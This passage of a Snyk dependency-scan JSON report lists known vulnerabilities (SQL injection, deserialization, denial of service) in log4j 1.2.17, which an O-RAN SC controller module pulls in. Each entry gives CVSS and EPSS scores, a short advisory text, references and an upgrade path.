        },
        "language": "java",
        "severity": "high",
        "cvssScore": 8.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "log4j:log4j",
        "references": [
          {
            "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y",
            "title": "Apache Mailing List"
          },
          {
            "url": "https://logging.apache.org/log4j/1.2/index.html",
            "title": "Apache Security Advisory"
          },
          {
            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
            "title": "Atlassian Patch"
          },
          {
            "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2",
            "title": "Reload4j Fix Commit"
          },
          {
            "url": "https://github.com/HynekPetrak/log4shell-finder",
            "title": "PoC in GitHub"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:49:15.350796Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.8,
            "modificationTime": "2024-03-11T09:53:56.412258Z"
          },
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.1,
            "modificationTime": "2024-03-11T09:49:35.270814Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:19.028376Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:15.350796Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 8.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:56.412258Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "SUSE",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:35.270814Z"
          }
        ],
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project. Note: Log4j 1.x reached End of Life in 2015, and is no longer supported.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n- [PoC in GitHub](https://github.com/HynekPetrak/log4shell-finder)\n",
        "epssDetails": {
          "percentile": "0.94104",
          "probability": "0.14136",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23305"
          ],
          "CWE": [
            "CWE-89"
          ]
        },
        "packageName": "log4j:log4j",
        "proprietary": false,
        "creationTime": "2022-01-18T17:06:29.378900Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-01-18T17:01:37Z",
        "exploitDetails": {
          "sources": [
            "PoC in GitHub"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "publicationTime": "2022-01-18T17:13:25Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-20T05:20:08.543230Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.slf4j:slf4j-log4j12@1.7.29",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [
          false,
          "org.slf4j:slf4j-log4j12@1.7.34"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "log4j:log4j",
        "version": "1.2.17"
      },
      {
        "id": "SNYK-JAVA-LOG4J-2342646",
        "title": "Deserialization of Untrusted Data",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "high",
        "cvssScore": 8.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "log4j:log4j",
        "references": [
          {
            "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh",
            "title": "Apache Mailing List"
          },
          {
            "url": "https://logging.apache.org/log4j/1.2/index.html",
            "title": "Apache Security Advisory"
          },
          {
            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
            "title": "Atlassian Patch"
          },
          {
            "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0",
            "title": "Reload4j Fix Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.8,
            "modificationTime": "2024-03-11T09:49:14.247158Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.8,
            "modificationTime": "2024-03-11T09:53:56.850146Z"
          },
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.1,
            "modificationTime": "2024-03-11T09:49:35.892889Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:19.076182Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 8.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:14.247158Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 8.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:56.850146Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "SUSE",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:35.892889Z"
          }
        ],
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project. Note: Log4j 1.x reached End of Life in 2015, and is no longer supported.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
        "epssDetails": {
          "percentile": "0.74612",
          "probability": "0.00882",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23307"
          ],
          "CWE": [
            "CWE-502"
          ]
        },
        "packageName": "log4j:log4j",
        "proprietary": false,
        "creationTime": "2022-01-18T17:08:37.955423Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-01-18T17:06:32Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "publicationTime": "2022-01-18T17:13:25Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:56.850146Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.slf4j:slf4j-log4j12@1.7.29",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [
          false,
          "org.slf4j:slf4j-log4j12@1.7.34"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "log4j:log4j",
        "version": "1.2.17"
      },
      {
        "id": "SNYK-JAVA-LOG4J-2342647",
        "title": "Deserialization of Untrusted Data",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "high",
        "cvssScore": 8.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "log4j:log4j",
        "references": [
          {
            "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w",
            "title": "Apache Mailing List"
          },
          {
            "url": "https://logging.apache.org/log4j/1.2/index.html",
            "title": "Apache Security Advisory"
          },
          {
            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
            "title": "Atlassian Patch"
          },
          {
            "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9",
            "title": "Reload4j Fix Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.8,
            "modificationTime": "2024-03-11T09:49:15.359241Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 8.8,
            "modificationTime": "2024-03-11T09:53:56.950451Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 6.6,
            "modificationTime": "2024-03-11T09:49:35.116490Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:19.046794Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 8.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:15.359241Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 8.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:56.950451Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 6.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:35.116490Z"
          }
        ],
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project. Note: Log4j 1.x reached End of Life in 2015, and is no longer supported.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
        "epssDetails": {
          "percentile": "0.64015",
          "probability": "0.00476",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23302"
          ],
          "CWE": [
            "CWE-502"
          ]
        },
        "packageName": "log4j:log4j",
        "proprietary": false,
        "creationTime": "2022-01-18T17:25:51.891230Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-01-18T17:22:50Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "publicationTime": "2022-01-18T17:28:19Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:56.950451Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.slf4j:slf4j-log4j12@1.7.29",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [
          false,
          "org.slf4j:slf4j-log4j12@1.7.34"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "log4j:log4j",
        "version": "1.2.17"
      },
      {
        "id": "SNYK-JAVA-LOG4J-3358774",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "Garrett Tucker of Red Hat"
        ],
        "semver": {
          "vulnerable": [
            "[1.0.4,]"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "medium",
        "cvssScore": 5.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "log4j:log4j",
        "references": [
          {
            "url": "https://lists.apache.org/thread/wkx6grrcjkh86crr49p4blc1v1nflj3t",
            "title": "Apache Lists"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:00.625998Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:54:00.618845Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.9,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:18.836042Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:00.625998Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:54:00.618845Z"
          }
        ],
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project. Note: Log4j 1.x reached End of Life in 2015, and is no longer supported.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). When using the `Chainsaw` or `SocketAppender` components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-crafted, deeply nested `hashmap` or `hashtable` (depending on which logging component is in use) to be processed could exhaust the available memory in the virtual machine and achieve denial of service when the object is deserialized. \r\n\r\nThis issue affects Apache Log4j before 2. Affected users are recommended to update to Log4j 2.x `org.apache.logging.log4j/log4j-core`.  \r\n\r\n*NOTE:* This vulnerability only affects products that are no longer supported by the maintainer.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Lists](https://lists.apache.org/thread/wkx6grrcjkh86crr49p4blc1v1nflj3t)\n",
        "epssDetails": {
          "percentile": "0.23311",
          "probability": "0.00075",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-26464"
          ],
          "CWE": [
            "CWE-400"
          ],
          "GHSA": [
            "GHSA-vp98-w2p3-mv35"
          ]
        },
        "packageName": "log4j:log4j",
        "proprietary": false,
        "creationTime": "2023-03-11T13:18:05.378536Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-03-10T15:30:43Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "publicationTime": "2023-03-11T13:18:05.600249Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:54:00.618845Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.slf4j:slf4j-log4j12@1.7.29",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [
          false,
          "org.slf4j:slf4j-log4j12@1.7.34"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "log4j:log4j",
        "version": "1.2.17"
      },
      {
        "id": "SNYK-JAVA-LOG4J-572732",
        "title": "Deserialization of Untrusted Data",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Marcio Almeida de Macedo"
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "critical",
        "cvssScore": 9.8,
        "functions": [
          {
            "version": [
              "[0,]"
            ],
            "functionId": {
              "filePath": "org/apache/log4j/net/SocketServer.java",
              "className": "SocketServer",
              "functionName": "main"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "log4j:log4j",
        "references": [
          {
            "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E",
            "title": "Apache Security Advisory"
          },
          {
            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
            "title": "Atlassian Patch"
          },
          {
            "url": "https://0xsapra.github.io/website/CVE-2019-17571",
            "title": "PoC"
          },
          {
            "url": "https://github.com/HynekPetrak/log4shell-finder",
            "title": "PoC in GitHub"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:48:48.793948Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:53:58.433978Z"
          },
          {
            "assigner": "SUSE",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:49:18.475888Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:19.055600Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:48:48.793948Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:58.433978Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "SUSE",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:18.475888Z"
          }
        ],
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project. Note: Log4j 1.x reached End of Life in 2015, and is no longer supported.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application, an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n- [PoC in GitHub](https://github.com/HynekPetrak/log4shell-finder)\n",
        "epssDetails": {
          "percentile": "0.97934",
          "probability": "0.54030",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2019-17571"
          ],
          "CWE": [
            "CWE-502"
          ],
          "GHSA": [
            "GHSA-2qrg-x229-3v8q"
          ]
